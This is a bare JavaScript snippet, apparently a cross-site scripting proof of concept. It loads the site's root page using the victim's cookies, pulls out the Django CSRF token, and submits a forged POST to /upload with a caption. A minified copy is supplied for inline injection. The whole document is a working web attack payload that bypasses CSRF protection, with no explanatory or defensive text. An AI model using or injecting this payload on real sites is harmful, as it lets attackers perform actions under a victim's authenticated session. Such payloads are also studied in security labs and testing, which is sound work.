fetch('/', {
    credentials: 'include', // Include cookies in the request
})
    .then(response => response.text())
    .then(html => {
        // Parse the HTML to extract the CSRF token
        const parser = new DOMParser();
        const doc = parser.parseFromString(html, 'text/html');
        const csrfToken = doc.querySelector('[name=\"csrfmiddlewaretoken\"]').value;

        // Now, use the token to submit the form
        fetch('/upload', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: 'csrfmiddlewaretoken='+csrfToken+'&amp;caption=TEST',
            credentials: 'include', // Include cookies in the request
        });
    });


// Minified and escaped for inline execution
"fetch('/',{credentials:'include'}).then((e=>e.text())).then((e=>{const t=(new DOMParser).parseFromString(e,'text/html').querySelector('[name=\'csrfmiddlewaretoken\']').value;fetch('/upload',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'csrfmiddlewaretoken='+t+'&amp;caption=TEST',credentials:'include'})}));"